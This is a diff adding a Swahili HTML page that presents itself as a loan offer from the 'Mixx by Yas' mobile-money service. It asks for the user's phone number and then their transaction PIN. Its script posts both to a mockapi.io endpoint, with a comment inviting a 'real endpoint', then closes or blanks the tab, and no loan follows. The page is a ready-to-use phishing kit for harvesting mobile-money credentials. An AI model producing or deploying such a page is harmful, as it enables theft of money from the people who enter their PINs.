@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title> IDA  </title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f9f4;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    .container {
+      background: #fff;
+      padding: 30px 40px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      text-align: center;
+      width: 320px;
+    }
+
+    h2 {
+      color: #1b5e20;
+      margin-bottom: 20px;
+    }
+
+    input[type="tel"],
+    input[type="password"] {
+      padding: 10px;
+      width: 250px;
+      border: 2px solid #ccc;
+      border-radius: 5px;
+      font-size: 16px;
+      margin-top: 10px;
+    }
+
+    input:focus {
+      border-color: #1b5e20;
+      outline: none;
+    }
+
+    button {
+      margin-top: 20px;
+      padding: 10px 30px;
+      background-color: #28a745;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #218838;
+    }
+
+    #pinSection {
+      margin-top: 20px;
+      display: none;
+    }
+
+    #status {
+      margin-top: 15px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2> </h2>
+
+    <!-- Phone input section -->
+    <div id="phoneSection">
+      <p>Weka namba yako ya Mixx by Yas ili kuendelea:</p>
+      <input type="tel" id="phone" placeholder="Weka nambari ya Mixx by Yas" maxlength="10" />
+      <br />
+      <button onclick="validatePhone()">Endelea</button>
+    </div>
+
+    <!-- PIN prompt section -->
+    <div id="pinSection">
+      <p>
+      <br> Weka nambari yako ya siri (ya kufanya muamala) ya Mixx by Yas ili kuendelea:<br /> <br> </p>
+      <input type="password" id="pin" placeholder="Weka nambari  ya Siri" maxlength="4" />
+      <br />
+      <button onclick="submitData()">Pokea mkopo </button>
+      <div id="status"></div>
+    </div>
+  </div>
+
+  <script>
+    function validatePhone() {
+      const phone = document.getElementById('phone').value.trim();
+      const ugPattern = /^(07|06)\d{8}$/;
+
+      if (ugPattern.test(phone)) {
+        // Hide phone section
+        document.getElementById('phoneSection').style.display = 'none';
+        // Show PIN prompt
+        document.getElementById('pinSection').style.display = 'block';
+      } else {
+        alert("❌ Invalid number! It must start with 07 and be 10 digits long.");
+      }
+    }
+
+    function submitData() {
+      const phone = document.getElementById('phone').value.trim();
+      const pin = document.getElementById('pin').value.trim();
+      const status = document.getElementById('status');
+
+      if (!/^\d{4}$/.test(pin)) {
+        alert("Please enter a valid 5-digit PIN.");
+        return;
+      }
+
+      
+      status.textContent = "Submitting...";
+      status.style.color = "blue";
+
+      // Mock JSON submission (replace with your real endpoint)
+      fetch("https://6a00b2aa36fb6ad04de069f8.mockapi.io/Base", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ phone, pin }),
+      })
+      .then(response => response.json())
+      .then(data => {
+        status.textContent = "✅ Successfully submitted!";
+        status.style.color = "green";
+        console.log("Mock response:", data);
+
+        // Wait a moment, then try to close tab
+        setTimeout(() => {
+          window.close();
+
+          // Fallback if browser prevents tab close
+          window.location.href = "about:blank";
+        }, 1500);
+      })
+      .catch(error => {
+        status.textContent = "❌ Submission failed!";
+        status.style.color = "red";
+        console.error("Error:", error);
+      });
+    }
+  </script>
+</body>
+</html>
